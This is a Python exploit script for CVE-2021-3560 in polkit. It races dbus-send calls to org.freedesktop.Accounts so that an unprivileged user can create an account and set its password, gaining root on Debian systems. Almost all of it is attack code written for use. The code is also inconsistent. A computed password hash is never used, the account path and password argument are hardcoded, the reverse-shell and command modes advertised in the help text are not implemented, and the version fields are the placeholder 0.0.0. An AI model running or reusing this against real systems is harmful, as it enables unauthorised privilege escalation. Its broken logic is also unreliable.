#!/usr/bin/env python3
# Exploit Title: polkit 0.0.0-0.0.0 - Arbitrary Code Execution
# Date: 05/02/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://gitlab.freedesktop.org/polkit/polkit/
# Software Link: 
# Version: 0.0.0-0.0.0
# Tested on: polkit 0.0.0 (Debian)
# CVE: CVE-2021–3560
# Source: https://github.com/UNICORDev/exploit-CVE-2021–3560
# Description: It was found that polkit could be tricked into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user.

# Imports
import os
import subprocess
import sys
import hashlib
import time
import timeit

# Class for colors
class color:
    red = '\033[91m'
    gold = '\033[93m'
    blue = '\033[36m'
    green = '\033[92m'
    no = '\033[0m'

# Print UNICORD ASCII Art
def UNICORD_ASCII():
    print(rf"""
{color.red}        _ __,~~~{color.gold}/{color.red}_{color.no}        {color.blue}__  ___  _______________  ___  ___{color.no}
{color.red}    ,~~`( )_( )-\|       {color.blue}/ / / / |/ /  _/ ___/ __ \/ _ \/ _ \{color.no}
{color.red}        |/|  `--.       {color.blue}/ /_/ /    // // /__/ /_/ / , _/ // /{color.no}
{color.green}_V__v___{color.red}!{color.green}_{color.red}!{color.green}__{color.red}!{color.green}_____V____{color.blue}\____/_/|_/___/\___/\____/_/|_/____/{color.green}....{color.no}
    """)

# Print exploit help menu
def help():
    print(r"""UNICORD Exploit for CVE-2021–3560

Usage:
  python3 exploit-CVE-2021–3560.py -u <custom_username>
  python3 exploit-CVE-2021–3560.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021–3560.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021–3560.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021–3560.py -h

Options:
  -u    Custom username mode. Provide username to be created.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.
""")

# Run the exploit
def exploit(username):

    UNICORD_ASCII()

    print(f"{color.red}RUNNING: {color.blue}UNICORD Exploit for CVE-2021–3560{color.no}")
    print(f"{color.red}PAYLOAD: {color.gold}" + username + f"{color.no}")

    #make sure we can access passwd & shadow file. (We will need to view the size of these later. . .)
    if not os.path.isfile("/etc/passwd"):
        print ("Error locating passwd file")

    if not os.path.isfile("/etc/shadow"):
        print ("Error locating shadow file")


    #inform user that if passwd or shadow file is changed this script will fail
    print("If a differnt user or password is changed other than in this program this script will prob fail")
    input('[Press <ENTER> to continue]')


    #gather passwd file size to determine when we successfully add a new user
    print("\n\nGathering passwd file size")
    passwd_size = subprocess.check_output("ls -l /etc/passwd | awk '{print $5}'", shell=True)
    passwd_size = passwd_size.decode("utf-8")
    passwd_size = int(passwd_size)
    print(passwd_size)


    #gather shadow file size to determine if we successfully change the password or not
    print("\n\nGathering shadow file size")
    shadow_size = subprocess.check_output("ls -l /etc/shadow | awk '{print $5}'", shell=True)
    shadow_size = shadow_size.decode("utf-8")
    shadow_size = int(shadow_size)
    print(shadow_size)

    #loop to create user through trial and error.
    error = False
    counter = 0.001
    create_user_cmd = ['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:' + username,'string:' + username,'int32:1']
    while not error:
        counter = counter + 0.0001
        create_user = subprocess.Popen(create_user_cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        try:
            create_user.wait(timeout=counter)
            create_user.kill()
        except subprocess.TimeoutExpired:
            create_user.kill()

        if counter>0.05:
            print("Error, user was not able to be created or already exists.")
            error = True
        
        #exit if passwd file changes in size
        new_passwd_size = subprocess.check_output("ls -l /etc/passwd | awk '{print $5}'", shell=True)
        new_passwd_size = int(new_passwd_size)
        if new_passwd_size != passwd_size:
            print("Passwd file changed, probably added the user")
            break




    #add password hash "batchest" to shadow file for created user
    password = subprocess.check_output("openssl passwd -5 batchest", shell=True)
    password = password.decode("utf-8")

    #


#dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'' string:username


    #loop to add password "batchest" to shadow file.
    error = False
    counter = 0.001
    add_password_cmd = ['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts/User1002','org.freedesktop.Accounts.User.SetPassword','string:','string:username']
    while not error:
        counter = counter + 0.0001
        create_user = subprocess.Popen(add_password_cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        try:
            create_user.wait(timeout=counter)
            create_user.kill()
        except subprocess.TimeoutExpired:
            create_user.kill()

        if counter>0.05:
            print("Error, user was not able to be created or already exists.")
            error = True
        
        #exit if passwd file changes in size
        new_shadow_size = subprocess.check_output("ls -l /etc/shadow | awk '{print $5}'", shell=True)
        new_shadow_size = int(new_shadow_size)
        if new_shadow_size != shadow_size:
            print("Shadow file changed, probably added the password")
            break







    print(f"{color.red}RUNTIME: {color.green}DONE - Exploit performed action.{color.no}\n")

    exit()

if __name__ == "__main__":

    args = ['-h','-u','-s','-i']
    
    if args[0] in sys.argv:
        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:
        username = sys.argv[sys.argv.index(args[1]) + 1]
        exploit(username)

    elif args[2] in sys.argv and not args[1] in sys.argv:
        command = ""
        exploit(command)

    else:
        help()
